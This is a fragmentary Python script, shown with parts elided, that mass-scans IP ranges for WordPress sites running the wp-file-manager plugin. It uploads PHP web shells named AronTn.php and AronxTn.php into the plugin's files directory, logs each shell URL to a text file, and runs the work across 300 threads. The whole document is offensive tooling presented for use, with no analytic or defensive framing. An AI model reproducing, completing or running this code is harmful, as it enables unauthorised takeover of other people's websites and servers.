...
def uploadshell(i):
 ...
 if b'\x89PNG\r\n\x1a' in r:
  ...
  open('AronTn-exp/shells1.txt', 'a').write(i + "/wp-content/plugins/wp-file-manager/lib/files/AronTn.php\n")
 if b'\x89PNG\r\n\x1a' in r2:
  print("\033[92m[+] Upload 2.2 .. Done\n SHELL : %s/wp-content/plugins/wp-file-manager/lib/files/AronxTn.php" % i)
  open('AronTn-exp/shells2.txt', 'a').write(i + "/wp-content/plugins/wp-file-manager/lib/files/AronxTn.php\n")
def wp(i):
 ...
 try:
  if wp(i):
   ...
   if 'windows' in str(requests.get(shell).text).lower() or 'linux' in str(requests.get(shell).text).lower():
       ...
       open('AronTn-exp/plugin-founded.txt', 'a').write(shell+"\n")
       uploadshell(i)
  else:
...
def sitfn(ip):
 try :
  ...
  if str(result) == '0':
   ...
   open("AronTn-exp/LiveIps.txt", "a").write(ip + "\n")
   bo = []
   lonk = 1
   while lonk < 299:
    ...
    for z in ya:
     ...
     if (o[0]+'//'+o[2]) in bo:
      ...
      with open('AronTn-exp/GrabedSites.txt','a+') as s:
       s.writelines((o[0]+'//'+o[2])+'\n')
    lonk = lonk+50
  else:
   print("\033[91m[-] "+ip+" ==> Die IP")
   open("AronTn-exp/DieIps.txt", "a").write(ip + "\n")
 except:
  print("\033[91m[-] "+ip+" ==> Passed IP")
  open("AronTn-exp/passedIps.txt", "a").write(ip + "\n")
def ipfin(i):
 if 'http://' in i :
  url=i.replace('http://','')
 if 'https://' in i:
 ...
 try:
  ...
  open('AronTn-exp/SitesIPs.txt', 'a+').write(hell + "\n")
  sitfn(hell)
 except:
...
if option==2:
 ...
 try:
  ...
  print(e)
 amir=open('AronTn-exp/GrabedSites.txt','r').read().splitlines()
 try:
  with concurrent.futures.ThreadPoolExecutor(300) as executor:
